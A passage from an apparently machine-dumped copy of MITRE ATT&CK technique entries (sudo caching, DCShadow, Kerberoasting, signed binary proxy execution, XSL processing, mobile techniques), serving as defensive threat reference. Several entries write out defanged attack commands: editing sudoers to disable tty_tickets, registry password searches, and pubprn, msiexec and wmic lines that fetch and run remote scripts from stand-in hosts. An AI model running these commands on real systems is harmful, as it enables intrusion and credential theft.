                          'falls within the <code>timestamp_timeout</code> range. If it does, then malware can execute '
                          "sudo commands without needing to supply the user's password. When <code>tty_tickets</code> "
                          'is disabled, adversaries can do this from any tty for that user. \n'
                          '\n'
                          'The OSX Proton Malware has disabled <code>tty_tickets</code> to potentially make scripting '
                          "easier by issuing <code>echo \\'Defaults !tty_tickets\\' >> /etc/sudoers</code>  (Citation: "
                          'cybereason osx proton). In order for this change to be reflected, the Proton malware also '
                          'must issue <code>killall Terminal</code>. As of macOS Sierra, the sudoers file has '
                          '<code>tty_tickets</code> enabled by default.',
           'name': 'Sudo Caching',
           'platforms': ['Linux', 'macOS']},
 'T1207': {'attack_id': 'T1207',
           'categories': ['defense-evasion'],
           'description': 'DCShadow is a method of manipulating Active Directory (AD) data, including objects and '
                          'schemas, by registering (or reusing an inactive registration) and simulating the behavior '
                          'of a Domain Controller (DC). (Citation: DCShadow Blog) (Citation: BlueHat DCShadow Jan '
                          '2018) Once registered, a rogue DC may be able to inject and replicate changes into AD '
                          'infrastructure for any domain object, including credentials and keys.\n'
                          '\n'
                          'Registering a rogue DC involves creating a new server and nTDSDSA objects in the '
                          'Configuration partition of the AD schema, which requires Administrator privileges (either '
                          'Domain or local to the DC) or the KRBTGT hash. (Citation: Adsecurity Mimikatz Guide)\n'
                          '\n'
                          'This technique may bypass system logging and security monitors such as security information '
                          'and event management (SIEM) products (since actions taken on a rogue DC may not be reported '
                          'to these sensors). (Citation: DCShadow Blog) The technique may also be used to alter and '
                          'delete replication and other associated metadata to obstruct forensic analysis. Adversaries '
                          'may also utilize this technique to perform [SID-History '
                          'Injection](https://attack.mitre.org/techniques/T1178) and/or manipulate AD objects (such as '
                          'accounts, access control lists, schemas) to establish backdoors for Persistence. (Citation: '
                          'DCShadow Blog) (Citation: BlueHat DCShadow Jan 2018)',
           'name': 'DCShadow',
           'platforms': ['Windows']},
 'T1208': {'attack_id': 'T1208',
           'categories': ['credential-access'],
           'description': 'Service principal names (SPNs) are used to uniquely identify each instance of a Windows '
                          'service. To enable authentication, Kerberos requires that SPNs be associated with at least '
                          'one service logon account (an account specifically tasked with running a service (Citation: '
                          'Microsoft Detecting Kerberoasting Feb 2018)). (Citation: Microsoft SPN) (Citation: '
                          'Microsoft SetSPN) (Citation: SANS Attacking Kerberos Nov 2014) (Citation: Harmj0y '
                          'Kerberoast Nov 2016)\n'
                          '\n'
                          'Adversaries possessing a valid Kerberos ticket-granting ticket (TGT) may request one or '
                          'more Kerberos ticket-granting service (TGS) service tickets for any SPN from a domain '
                          'controller (DC). (Citation: Empire InvokeKerberoast Oct 2016) (Citation: AdSecurity '
                          'Cracking Kerberos Dec 2015) Portions of these tickets may be encrypted with the RC4 '
                          'algorithm, meaning the Kerberos 5 TGS-REP etype 23 hash of the service account associated '
                          'with the SPN is used as the private key and is thus vulnerable to offline [Brute '
                          'Force](https://attack.mitre.org/techniques/T1110) attacks that may expose plaintext '
                          'credentials. (Citation: AdSecurity Cracking Kerberos Dec 2015) (Citation: Empire '
                          'InvokeKerberoast Oct 2016) (Citation: Harmj0y Kerberoast Nov 2016)\n'
                          '\n'
                          'This same attack could be executed using service tickets captured from network traffic. '
                          '(Citation: AdSecurity Cracking Kerberos Dec 2015)\n'
                          '\n'
                          'Cracked hashes may enable Persistence, Privilege Escalation, and  Lateral Movement via '
                          'access to [Valid Accounts](https://attack.mitre.org/techniques/T1078). (Citation: SANS '
                          'Attacking Kerberos Nov 2014)',
           'name': 'Kerberoasting',
           'platforms': ['Windows']},
 'T1209': {'attack_id': 'T1209',
           'categories': ['persistence'],
           'description': 'The Windows Time service (W32Time) enables time synchronization across and within domains. '
                          '(Citation: Microsoft W32Time Feb 2018) W32Time time providers are responsible for '
                          'retrieving time stamps from hardware/network resources and outputting these values to other '
                          'network clients. (Citation: Microsoft TimeProvider)\n'
                          '\n'
                          'Time providers are implemented as dynamic-link libraries (DLLs) that are registered in the '
                          'subkeys of  '
                          '<code>HKEY_LOCAL_MACHINE\\System\\CurrentControlSet\\Services\\W32Time\\TimeProviders\\</code>. '
                          '(Citation: Microsoft TimeProvider) The time provider manager, directed by the service '
                          'control manager, loads and starts time providers listed and enabled under this key at '
                          'system startup and/or whenever parameters are changed. (Citation: Microsoft TimeProvider)\n'
                          '\n'
                          'Adversaries may abuse this architecture to establish Persistence, specifically by '
                          'registering and enabling a malicious DLL as a time provider. Administrator privileges are '
                          'required for time provider registration, though execution will run in context of the Local '
                          'Service account. (Citation: Github W32Time Oct 2017)',
           'name': 'Time Providers',
           'platforms': ['Windows']},
 'T1210': {'attack_id': 'T1210',
           'categories': ['lateral-movement'],
           'description': 'Exploitation of a software vulnerability occurs when an adversary takes advantage of a '
                          'programming error in a program, service, or within the operating system software or kernel '
                          'itself to execute adversary-controlled code.\xa0A common goal for post-compromise '
                          'exploitation of remote services is for lateral movement to enable access to a remote '
                          'system.\n'
                          '\n'
                          'An adversary may need to determine if the remote system is in a vulnerable state, which may '
                          'be done through [Network Service Scanning](https://attack.mitre.org/techniques/T1046) or '
                          'other Discovery methods looking for common, vulnerable software that may be deployed in the '
                          'network, the lack of certain patches that may indicate vulnerabilities,  or security '
                          'software that may be used to detect or contain remote exploitation. Servers are likely a '
                          'high value target for lateral movement exploitation, but endpoint systems may also be at '
                          'risk if they provide an advantage or access to additional resources.\n'
                          '\n'
                          'There are several well-known vulnerabilities that exist in common services such as SMB '
                          '(Citation: CIS Multiple SMB Vulnerabilities) and RDP (Citation: NVD CVE-2017-0176) as well '
                          'as applications that may be used within internal networks such as MySQL (Citation: NVD '
                          'CVE-2016-6662) and web server services. (Citation: NVD CVE-2014-7169)\n'
                          '\n'
                          'Depending on the permissions level of the vulnerable remote service an adversary may '
                          'achieve [Exploitation for Privilege Escalation](https://attack.mitre.org/techniques/T1068) '
                          'as a result of lateral movement exploitation as well.',
           'name': 'Exploitation of Remote Services',
           'platforms': ['Linux', 'Windows', 'macOS']},
 'T1211': {'attack_id': 'T1211',
           'categories': ['defense-evasion'],
           'description': 'Exploitation of a software vulnerability occurs when an adversary takes advantage of a '
                          'programming error in a program, service, or within the operating system software or kernel '
                          'itself to execute adversary-controlled code.\xa0Vulnerabilities may exist in defensive '
                          'security software that can be used to disable or circumvent them.\n'
                          '\n'
                          'Adversaries may have prior knowledge through reconnaissance that security software exists '
                          'within an environment or they may perform checks during or shortly after the system is '
                          'compromised for [Security Software Discovery](https://attack.mitre.org/techniques/T1063). '
                          'The security software will likely be targeted directly for exploitation. There are examples '
                          'of antivirus software being targeted by persistent threat groups to avoid detection.',
           'name': 'Exploitation for Defense Evasion',
           'platforms': ['Linux', 'Windows', 'macOS']},
 'T1212': {'attack_id': 'T1212',
           'categories': ['credential-access'],
           'description': 'Exploitation of a software vulnerability occurs when an adversary takes advantage of a '
                          'programming error in a program, service, or within the operating system software or kernel '
                          'itself to execute adversary-controlled code.\xa0Credentialing and authentication mechanisms '
                          'may be targeted for exploitation by adversaries as a means to gain access to useful '
                          'credentials or circumvent the process to gain access to systems. One example of this is '
                          'MS14-068, which targets Kerberos and can be used to forge Kerberos tickets using domain '
                          'user permissions. (Citation: Technet MS14-068) (Citation: ADSecurity Detecting Forged '
                          'Tickets) Exploitation for credential access may also result in Privilege Escalation '
                          'depending on the process targeted or credentials obtained.',
           'name': 'Exploitation for Credential Access',
           'platforms': ['Linux', 'Windows', 'macOS']},
 'T1213': {'attack_id': 'T1213',
           'categories': ['collection'],
           'description': 'Adversaries may leverage information repositories to mine valuable information. Information '
                          'repositories are tools that allow for storage of information, typically to facilitate '
                          'collaboration or information sharing between users, and can store a wide variety of data '
                          'that may aid adversaries in further objectives, or direct access to the target '
                          'information.\n'
                          '\n'
                          'Adversaries may also collect information from shared storage repositories hosted on cloud '
                          'infrastructure or in software-as-a-service (SaaS) applications, as storage is one of the '
                          'more fundamental requirements for cloud services and systems.\n'
                          '\n'
                          'The following is a brief list of example information that may hold potential value to an '
                          'adversary and may also be found on an information repository:\n'
                          '\n'
                          '* Policies, procedures, and standards\n'
                          '* Physical / logical network diagrams\n'
                          '* System architecture diagrams\n'
                          '* Technical system documentation\n'
                          '* Testing / development credentials\n'
                          '* Work / project schedules\n'
                          '* Source code snippets\n'
                          '* Links to network shares and other internal resources\n'
                          '\n'
                          'Specific common information repositories include:\n'
                          '\n'
                          '### Microsoft SharePoint\n'
                          'Found in many enterprise networks and often used to store and share significant amounts of '
                          'documentation.\n'
                          '\n'
                          '### Atlassian Confluence\n'
                          'Often found in development environments alongside Atlassian JIRA, Confluence is generally '
                          'used to store development-related documentation.',
           'name': 'Data from Information Repositories',
           'platforms': ['Linux', 'Windows', 'macOS', 'SaaS', 'AWS', 'GCP', 'Azure']},
 'T1214': {'attack_id': 'T1214',
           'categories': ['credential-access'],
           'description': 'The Windows Registry stores configuration information that can be used by the system or '
                          'other programs. Adversaries may query the Registry looking for credentials and passwords '
                          'that have been stored for use by other programs or services. Sometimes these credentials '
                          'are used for automatic logons.\n'
                          '\n'
                          'Example commands to find Registry keys related to password information: (Citation: '
                          'Pentestlab Stored Credentials)\n'
                          '\n'
                          '* Local Machine Hive: <code>reg query HKLM /f password /t REG_SZ /s</code>\n'
                          '* Current User Hive: <code>reg query HKCU /f password /t REG_SZ /s</code>',
           'name': 'Credentials in Registry',
           'platforms': ['Windows']},
 'T1215': {'attack_id': 'T1215',
           'categories': ['persistence'],
           'description': 'Loadable Kernel Modules (or LKMs) are pieces of code that can be loaded and unloaded into '
                          'the kernel upon demand. They extend the functionality of the kernel without the need to '
                          'reboot the system. For example, one type of module is the device driver, which allows the '
                          'kernel to access hardware connected to the system. (Citation: Linux Kernel Programming)\xa0'
                          'When used maliciously, Loadable Kernel Modules (LKMs) can be a type of kernel-mode '
                          '[Rootkit](https://attack.mitre.org/techniques/T1014) that run with the highest operating '
                          'system privilege (Ring 0). (Citation: Linux Kernel Module Programming Guide)\xa0Adversaries '
                          'can use loadable kernel modules to covertly persist on a system and evade defenses. '
                          'Examples have been found in the wild and there are some open source projects. (Citation: '
                          'Volatility Phalanx2) (Citation: CrowdStrike Linux Rootkit) (Citation: GitHub Reptile) '
                          '(Citation: GitHub Diamorphine)\n'
                          '\n'
                          'Common features of LKM based rootkits include: hiding itself, selective hiding of files, '
                          'processes and network activity, as well as log tampering, providing authenticated backdoors '
                          'and enabling root access to non-privileged users. (Citation: iDefense Rootkit Overview)\n'
                          '\n'
                          'Kernel extensions, also called kext, are used for macOS to load functionality onto a system '
                          'similar to LKMs for Linux. They are loaded and unloaded through <code>kextload</code> and '
                          '<code>kextunload</code> commands. Several examples have been found where this can be used. '
                          '(Citation: RSAC 2015 San Francisco Patrick Wardle) (Citation: Synack Secure Kernel '
                          'Extension Broken) Examples have been found in the wild. (Citation: Securelist Ventir)',
           'name': 'Kernel Modules and Extensions',
           'platforms': ['Linux', 'macOS']},
 'T1216': {'attack_id': 'T1216',
           'categories': ['defense-evasion', 'execution'],
           'description': 'Scripts signed with trusted certificates can be used to proxy execution of malicious files. '
                          'This behavior may bypass signature validation restrictions and application whitelisting '
                          'solutions that do not account for use of these scripts.\n'
                          '\n'
                          'PubPrn.vbs is signed by Microsoft and can be used to proxy execution from a remote site. '
                          '(Citation: Enigma0x3 PubPrn Bypass) Example command: <code>cscript '
                          'C[:]\\Windows\\System32\\Printing_Admin_Scripts\\en-US\\pubprn[.]vbs 127.0.0.1 '
                          'script:http[:]//192.168.1.100/hi.png</code>\n'
                          '\n'
                          'There are several other signed scripts that may be used in a similar manner. (Citation: '
                          'GitHub Ultimate AppLocker Bypass List)',
           'name': 'Signed Script Proxy Execution',
           'platforms': ['Windows']},
 'T1217': {'attack_id': 'T1217',
           'categories': ['discovery'],
           'description': 'Adversaries may enumerate browser bookmarks to learn more about compromised hosts. Browser '
                          'bookmarks may reveal personal information about users (ex: banking sites, interests, social '
                          'media, etc.) as well as details about internal network resources such as servers, '
                          'tools/dashboards, or other related infrastructure.\n'
                          '\n'
                          'Browser bookmarks may also highlight additional targets after an adversary has access to '
                          'valid credentials, especially [Credentials in '
                          'Files](https://attack.mitre.org/techniques/T1081) associated with logins cached by a '
                          'browser.\n'
                          '\n'
                          'Specific storage locations vary based on platform and/or application, but browser bookmarks '
                          'are typically stored in local files/databases.',
           'name': 'Browser Bookmark Discovery',
           'platforms': ['Linux', 'Windows', 'macOS']},
 'T1218': {'attack_id': 'T1218',
           'categories': ['defense-evasion', 'execution'],
           'description': 'Binaries signed with trusted digital certificates can execute on Windows systems protected '
                          'by digital signature validation. Several Microsoft signed binaries that are default on '
                          'Windows installations can be used to proxy execution of other files. This behavior may be '
                          'abused by adversaries to execute malicious files that could bypass application whitelisting '
                          'and signature validation on systems. This technique accounts for proxy execution methods '
                          'that are not already accounted for within the existing techniques.\n'
                          '\n'
                          '### Msiexec.exe\n'
                          'Msiexec.exe is the command-line Windows utility for the Windows Installer. Adversaries may '
                          'use msiexec.exe to launch malicious MSI files for code execution. An adversary may use it '
                          'to launch local or network accessible MSI files.(Citation: LOLBAS Msiexec)(Citation: Rancor '
                          'Unit42 June 2018)(Citation: TrendMicro Msiexec Feb 2018) Msiexec.exe may also be used to '
                          'execute DLLs.(Citation: LOLBAS Msiexec)\n'
                          '\n'
                          '* <code>msiexec.exe /q /i "C:\\path\\to\\file.msi"</code>\n'
                          '* <code>msiexec.exe /q /i http[:]//site[.]com/file.msi</code>\n'
                          '* <code>msiexec.exe /y "C:\\path\\to\\file.dll"</code>\n'
                          '\n'
                          '### Mavinject.exe\n'
                          'Mavinject.exe is a Windows utility that allows for code execution. Mavinject can be used to '
                          'input a DLL into a running process. (Citation: Twitter gN3mes1s Status Update MavInject32)\n'
                          '\n'
                          '* <code>"C:\\Program Files\\Common Files\\microsoft shared\\ClickToRun\\MavInject32.exe" '
                          '&lt;PID&gt; /INJECTRUNNING &lt;PATH DLL&gt;</code>\n'
                          '* <code>C:\\Windows\\system32\\mavinject.exe &lt;PID&gt; /INJECTRUNNING &lt;PATH '
                          'DLL&gt;</code>\n'
                          '\n'
                          '### SyncAppvPublishingServer.exe\n'
                          'SyncAppvPublishingServer.exe can be used to run PowerShell scripts without executing '
                          'powershell.exe. (Citation: Twitter monoxgas Status Update SyncAppvPublishingServer)\n'
                          '\n'
                          '### Odbcconf.exe\n'
                          'Odbcconf.exe is a Windows utility that allows you to configure Open Database Connectivity '
                          '(ODBC) drivers and data source names.(Citation: Microsoft odbcconf.exe) The utility can be '
                          'misused to execute functionality equivalent to '
                          '[Regsvr32](https://attack.mitre.org/techniques/T1117) with the REGSVR option to execute a '
                          'DLL.(Citation: LOLBAS Odbcconf)(Citation: TrendMicro Squiblydoo Aug 2017)(Citation: '
                          'TrendMicro Cobalt Group Nov 2017)\n'
                          '\n'
                          '* <code>odbcconf.exe /S /A &lbrace;REGSVR "C:\\Users\\Public\\file.dll"&rbrace;</code>\n'
                          '\n'
                          'Several other binaries exist that may be used to perform similar behavior. (Citation: '
                          'GitHub Ultimate AppLocker Bypass List)',
           'name': 'Signed Binary Proxy Execution',
           'platforms': ['Windows']},
 'T1219': {'attack_id': 'T1219',
           'categories': ['command-and-control'],
           'description': 'An adversary may use legitimate desktop support and remote access software, such as Team '
                          'Viewer, Go2Assist, LogMein, AmmyyAdmin, etc, to establish an interactive command and '
                          'control channel to target systems within networks. These services are commonly used as '
                          'legitimate technical support software, and may be whitelisted within a target environment. '
                          'Remote access tools like VNC, Ammy, and Teamviewer are used frequently when compared with '
                          'other legitimate software commonly used by adversaries. (Citation: Symantec Living off the '
                          'Land)\n'
                          '\n'
                          'Remote access tools may be established and used post-compromise as alternate communications '
                          'channel for [Redundant Access](https://attack.mitre.org/techniques/T1108) or as a way to '
                          'establish an interactive remote desktop session with the target system. They may also be '
                          'used as a component of malware to establish a reverse connection or back-connect to a '
                          'service or adversary controlled system.\n'
                          '\n'
                          'Admin tools such as TeamViewer have been used by several groups targeting institutions in '
                          'countries of interest to the Russian state and criminal campaigns. (Citation: CrowdStrike '
                          '2015 Global Threat Report) (Citation: CrySyS Blog TeamSpy)',
           'name': 'Remote Access Tools',
           'platforms': ['Linux', 'Windows', 'macOS']},
 'T1220': {'attack_id': 'T1220',
           'categories': ['defense-evasion', 'execution'],
           'description': 'Extensible Stylesheet Language (XSL) files are commonly used to describe the processing and '
                          'rendering of data within XML files. To support complex operations, the XSL standard '
                          'includes support for embedded scripting in various languages. (Citation: Microsoft XSLT '
                          'Script Mar 2017)\n'
                          '\n'
                          'Adversaries may abuse this functionality to execute arbitrary files while potentially '
                          'bypassing application whitelisting defenses. Similar to [Trusted Developer '
                          'Utilities](https://attack.mitre.org/techniques/T1127), the Microsoft common line '
                          'transformation utility binary (msxsl.exe) (Citation: Microsoft msxsl.exe) can be installed '
                          'and used to execute malicious JavaScript embedded within local or remote (URL referenced) '
                          'XSL files. (Citation: Penetration Testing Lab MSXSL July 2017) Since msxsl.exe is not '
                          'installed by default, an adversary will likely need to package it with dropped files. '
                          '(Citation: Reaqta MSXSL Spearphishing MAR 2018) Msxsl.exe takes two main arguments, an XML '
                          'source file and an XSL stylesheet. Since the XSL file is valid XML, the adversary may call '
                          'the same XSL file twice. When using msxsl.exe adversaries may also give the XML/XSL files '
                          'an arbitrary file extension.(Citation: XSL Bypass Mar 2019)\n'
                          '\n'
                          'Command-line examples:(Citation: Penetration Testing Lab MSXSL July 2017)(Citation: XSL '
                          'Bypass Mar 2019)\n'
                          '\n'
                          '* <code>msxsl.exe customers[.]xml script[.]xsl</code>\n'
                          '* <code>msxsl.exe script[.]xsl script[.]xsl</code>\n'
                          '* <code>msxsl.exe script[.]jpeg script[.]jpeg</code>\n'
                          '\n'
                          'Another variation of this technique, dubbed “Squiblytwo”, involves using [Windows '
                          'Management Instrumentation](https://attack.mitre.org/techniques/T1047) to invoke JScript or '
                          'VBScript within an XSL file.(Citation: LOLBAS Wmic) This technique can also execute '
                          'local/remote scripts and, similar to its '
                          '[Regsvr32](https://attack.mitre.org/techniques/T1117)/ "Squiblydoo" counterpart, leverages '
                          'a trusted, built-in Windows tool. Adversaries may abuse any alias in [Windows Management '
                          'Instrumentation](https://attack.mitre.org/techniques/T1047) provided they utilize the '
                          '/FORMAT switch.(Citation: XSL Bypass Mar 2019)\n'
                          '\n'
                          'Command-line examples:(Citation: XSL Bypass Mar 2019)(Citation: LOLBAS Wmic)\n'
                          '\n'
                          '* Local File: <code>wmic process list /FORMAT:evil[.]xsl</code>\n'
                          '* Remote File: <code>wmic os get /FORMAT:”https[:]//example[.]com/evil[.]xsl”</code>',
           'name': 'XSL Script Processing',
           'platforms': ['Windows']},
 'T1221': {'attack_id': 'T1221',
           'categories': ['defense-evasion'],
           'description': 'Microsoft’s Open Office XML (OOXML) specification defines an XML-based format for Office '
                          'documents (.docx, xlsx, .pptx) to replace older binary formats (.doc, .xls, .ppt). OOXML '
                          'files are packed together ZIP archives compromised of various XML files, referred to as '
                          'parts, containing properties that collectively define how a document is rendered. '
                          '(Citation: Microsoft Open XML July 2017)\n'
                          '\n'
                          'Properties within parts may reference shared public resources accessed via online URLs. For '
                          'example, template properties reference a file, serving as a pre-formatted document '
                          'blueprint, that is fetched when the document is loaded.\n'
                          '\n'
                          'Adversaries may abuse this technology to initially conceal malicious code to be executed '
                          'via documents (i.e. [Scripting](https://attack.mitre.org/techniques/T1064)). Template '
                          'references injected into a document may enable malicious payloads to be fetched and '
                          'executed when the document is loaded. (Citation: SANS Brian Wiltse Template Injection) '
                          'These documents can be delivered via other techniques such as [Spearphishing '
                          'Attachment](https://attack.mitre.org/techniques/T1193) and/or [Taint Shared '
                          'Content](https://attack.mitre.org/techniques/T1080) and may evade static detections since '
                          'no typical indicators (VBA macro, script, etc.) are present until after the malicious '
                          'payload is fetched. (Citation: Redxorblue Remote Template Injection) Examples have been '
                          'seen in the wild where template injection was used to load malicious code containing an '
                          'exploit. (Citation: MalwareBytes Template Injection OCT 2017)\n'
                          '\n'
                          'This technique may also enable [Forced '
                          'Authentication](https://attack.mitre.org/techniques/T1187) by injecting a SMB/HTTPS (or '
                          'other credential prompting) URL and triggering an authentication attempt. (Citation: '
                          'Anomali Template Injection MAR 2018) (Citation: Talos Template Injection July 2017) '
                          '(Citation: ryhanson phishery SEPT 2016)',
           'name': 'Template Injection',
           'platforms': ['Windows']},
 'T1222': {'attack_id': 'T1222',
           'categories': ['defense-evasion'],
           'description': 'File and directory permissions are commonly managed by discretionary access control lists '
                          '(DACLs) specified by the file or directory owner. File and directory DACL implementations '
                          'may vary by platform, but generally explicitly designate which users/groups can perform '
                          'which actions (ex: read, write, execute, etc.). (Citation: Microsoft DACL May 2018) '
                          '(Citation: Microsoft File Rights May 2018) (Citation: Unix File Permissions)\n'
                          '\n'
                          'Adversaries may modify file or directory permissions/attributes to evade intended DACLs. '
                          '(Citation: Hybrid Analysis Icacls1 June 2018) (Citation: Hybrid Analysis Icacls2 May 2018) '
                          'Modifications may include changing specific access rights, which may require taking '
                          'ownership of a file or directory and/or elevated permissions such as Administrator/root '
                          "depending on the file or directory's existing permissions to enable malicious activity such "
                          'as modifying, replacing, or deleting specific files/directories. Specific file and '
                          'directory modifications may be a required step for many techniques, such as establishing '
                          'Persistence via [Accessibility Features](https://attack.mitre.org/techniques/T1015), [Logon '
                          'Scripts](https://attack.mitre.org/techniques/T1037), or tainting/hijacking other '
                          'instrumental binary/configuration files.',
           'name': 'File and Directory Permissions Modification',
           'platforms': ['Linux', 'Windows', 'macOS']},
 'T1223': {'attack_id': 'T1223',
           'categories': ['defense-evasion', 'execution'],
           'description': 'Compiled HTML files (.chm) are commonly distributed as part of the Microsoft HTML Help '
                          'system. CHM files are compressed compilations of various content such as HTML documents, '
                          'images, and scripting/web related programming languages such VBA, JScript, Java, and '
                          'ActiveX. (Citation: Microsoft HTML Help May 2018) CHM content is displayed using underlying '
                          'components of the Internet Explorer browser (Citation: Microsoft HTML Help ActiveX) loaded '
                          'by the HTML Help executable program (hh.exe). (Citation: Microsoft HTML Help Executable '
                          'Program)\n'
                          '\n'
                          'Adversaries may abuse this technology to conceal malicious code. A custom CHM file '
                          'containing embedded payloads could be delivered to a victim then triggered by [User '
                          'Execution](https://attack.mitre.org/techniques/T1204). CHM execution may also bypass '
                          'application whitelisting on older and/or unpatched systems that do not account for '
                          'execution of binaries through hh.exe. (Citation: MsitPros CHM Aug 2017) (Citation: '
                          'Microsoft CVE-2017-8625 Aug 2017)',
           'name': 'Compiled HTML File',
           'platforms': ['Windows']},
 'T1398': {'attack_id': 'T1398',
           'categories': ['defense-evasion', 'persistence'],
           'description': 'If an adversary can escalate privileges, he or she may be able to use those privileges to '
                          'place malicious code in the device kernel or other boot partition components, where the '
                          'code may evade detection, may persist after device resets, and may not be removable by the '
                          'device user. In some cases (e.g., the Samsung Knox warranty bit as described under '
                          'Detection), the attack may be detected but could result in the device being placed in a '
                          'state that no longer allows certain functionality.\n'
                          '\n'
                          'Many Android devices provide the ability to unlock the bootloader for development purposes, '
                          'but doing so introduces the potential ability for others to maliciously update the kernel '
                          'or other boot partition code.\n'
                          '\n'
                          'If the bootloader is not unlocked, it may still be possible to exploit device '
                          'vulnerabilities to update the code.',
           'name': 'Modify OS Kernel or Boot Partition',
           'platforms': ['Android', 'iOS']},
 'T1399': {'attack_id': 'T1399',
           'categories': ['defense-evasion', 'persistence'],
           'description': 'If an adversary can escalate privileges, he or she may be able to use those privileges to '
                          "place malicious code in the device's Trusted Execution Environment (TEE) or other similar "
                          'isolated execution environment where the code can evade detection, may persist after device '
                          'resets, and may not be removable by the device user. Running code within the TEE may '
                          'provide an adversary with the ability to monitor or tamper with overall device '
                          'behavior.(Citation: Roth-Rootkits)',
           'name': 'Modify Trusted Execution Environment',
           'platforms': ['Android']},
 'T1400': {'attack_id': 'T1400',
           'categories': ['defense-evasion', 'persistence', 'impact'],
           'description': 'If an adversary can escalate privileges, he or she may be able to use those privileges to '
                          'place malicious code in the device system partition, where it may persist after device '
                          'resets and may not be easily removed by the device user.\n'
                          '\n'
                          'Many Android devices provide the ability to unlock the bootloader for development purposes. '
                          'An unlocked bootloader may provide the ability for an adversary to modify the system '
                          'partition. Even if the bootloader is locked, it may be possible for an adversary to '
                          'escalate privileges and then modify the system partition.',
           'name': 'Modify System Partition',
           'platforms': ['Android', 'iOS']},
 'T1401': {'attack_id': 'T1401',
           'categories': ['persistence'],
           'description': 'A malicious application can request Device Administrator privileges. If the user grants the '
                          'privileges, the application can take steps to make its removal more difficult.',
           'name': 'Abuse Device Administrator Access to Prevent Removal',
           'platforms': ['Android']},
 'T1402': {'attack_id': 'T1402',
           'categories': ['persistence'],
           'description': "An Android application can listen for the BOOT_COMPLETED broadcast, ensuring that the app's "
                          'functionality will be activated every time the device starts up without having to wait for '
                          'the device user to manually start the app.\n'
                          '\n'
                          'An analysis published in 2012(Citation: Zhou) of 1260 Android malware samples belonging to '
                          '49 families of malware determined that 29 malware families and 83.3% of the samples '
                          'listened for BOOT_COMPLETED.',
           'name': 'App Auto-Start at Device Boot',
           'platforms': ['Android']},
 'T1403': {'attack_id': 'T1403',
           'categories': ['persistence'],
           'description': 'ART (the Android Runtime) compiles optimized code on the device itself to improve '
                          'performance. An adversary may be able to use escalated privileges to modify the cached code '
                          'in order to hide malicious behavior. Since the code is compiled on the device, it may not '
                          'receive the same level of integrity checks that are provided to code running in the system '
                          'partition.(Citation: Sabanal-ART)',
           'name': 'Modify Cached Executable Code',
           'platforms': ['Android']},
 'T1404': {'attack_id': 'T1404',
           'categories': ['privilege-escalation'],
           'description': 'A malicious app can exploit unpatched vulnerabilities in the operating system to obtain '
                          'escalated privileges.',
           'name': 'Exploit OS Vulnerability',
           'platforms': ['Android', 'iOS']},
 'T1405': {'attack_id': 'T1405',
           'categories': ['credential-access', 'privilege-escalation'],
           'description': 'A malicious app or other attack vector could be used to exploit vulnerabilities in code '
                          'running within the Trusted Execution Environment (TEE) (Citation: Thomas-TrustZone). The '
                          'adversary could then obtain privileges held by the TEE potentially including the ability to '
                          'access cryptographic keys or other sensitive data (Citation: QualcommKeyMaster). Escalated '
                          'operating system privileges may be first required in order to have the ability to attack '
                          'the TEE (Citation: EkbergTEE). If not, privileges within the TEE can potentially be used to '
                          'exploit the operating system (Citation: laginimaineb-TEE).',
           'name': 'Exploit TEE Vulnerability',
           'platforms': ['Android']},
 'T1406': {'attack_id': 'T1406',
           'categories': ['defense-evasion'],
           'description': 'An app could contain malicious code in obfuscated or encrypted form, then deobfuscate or '
                          'decrypt the code at runtime to evade many app vetting techniques.(Citation: Rastogi) '
                          '(Citation: Zhou) (Citation: TrendMicro-Obad) (Citation: Xiao-iOS)',
           'name': 'Obfuscated Files or Information',
           'platforms': ['Android', 'iOS']},
 'T1407': {'attack_id': 'T1407',
           'categories': ['defense-evasion'],
           'description': 'An app could download and execute dynamic code (not included in the original application '
                          'package) after installation to evade static analysis techniques (and potentially dynamic '
                          'analysis techniques) used for application vetting or application store review.(Citation: '
                          'Poeplau-ExecuteThis)\n'
                          '\n'
                          'On Android, dynamic code could include native code, Dalvik code, or JavaScript code that '
                          "uses the Android WebView's JavascriptInterface capability.(Citation: Bromium-AndroidRCE)\n"
                          '\n'
                          'On iOS, techniques also exist for executing dynamic code downloaded after application '
                          'installation.(Citation: FireEye-JSPatch)(Citation: Wang)',
           'name': 'Download New Code at Runtime',
           'platforms': ['Android', 'iOS']},
 'T1408': {'attack_id': 'T1408',
           'categories': ['defense-evasion'],
           'description': 'An adversary could use knowledge of the techniques used by security software to evade '
                          'detection(Citation: Brodie)(Citation: Tan). For example, some mobile security products '
                          'perform compromised device detection by searching for particular artifacts such as an '
                          'installed "su" binary, but that check could be evaded by naming the binary something else. '
                          'Similarly, polymorphic code techniques could be used to evade signature-based '
                          'detection(Citation: Rastogi).',
           'name': 'Disguise Root/Jailbreak Indicators',
           'platforms': ['Android', 'iOS']},
 'T1409': {'attack_id': 'T1409',
           'categories': ['collection', 'credential-access'],
           'description': 'Adversaries may access and collect application data resident on the device. Adversaries '
                          'often target popular applications such as Facebook, WeChat, and Gmail.(Citation: SWB Exodus '
                          'March 2019)\n'
                          '\n'
                          'This technique requires either escalated privileges or for the targeted app to have stored '
                          'the data in an insecure manner (e.g., with insecure file permissions or in an insecure '
                          'location such as an external storage directory).',
           'name': 'Access Stored Application Data',
           'platforms': ['Android', 'iOS']},
 'T1410': {'attack_id': 'T1410',
           'categories': ['collection', 'credential-access'],
           'description': 'An adversary may capture network traffic to and from the device to obtain credentials or '
                          'other sensitive data, or redirect network traffic to flow through an adversary-controlled '
                          'gateway to do the same.\n'
                          '\n'
                          'A malicious app could register itself as a VPN client on Android or iOS to gain access to '
                          'network packets. However, on both platforms, the user must grant consent to the app to act '
                          'as a VPN client, and on iOS the app requires a special entitlement that must be granted by '
                          'Apple.\n'
                          '\n'
                          'Alternatively, if a malicious app is able to escalate operating system privileges, it may '
                          'be able to use those privileges to gain access to network traffic.\n'
                          '\n'
                          'An adversary could redirect network traffic to an adversary-controlled gateway by '
                          "establishing a VPN connection or by manipulating the device's proxy settings. For example, "
                          'Skycure (Citation: Skycure-Profiles) describes the ability to redirect network traffic by '
                          'installing a malicious iOS Configuration Profile.\n'
                          '\n'
                          'If applications encrypt their network traffic, sensitive data may not be accessible to an '
                          'adversary, depending on the point of capture.',
           'name': 'Network Traffic Capture or Redirection',
           'platforms': ['Android', 'iOS']},
 'T1411': {'attack_id': 'T1411',
           'categories': ['credential-access'],
           'description': 'The operating system and installed applications often have legitimate needs to prompt the '
                          'user for sensitive information such as account credentials, bank account information, or '
                          'Personally Identifiable Information (PII). Adversaries may mimic this functionality to '
                          'prompt users for sensitive information.\n'
                          '\n'
                          'Compared to traditional PCs, the constrained display size of mobile devices may impair the '
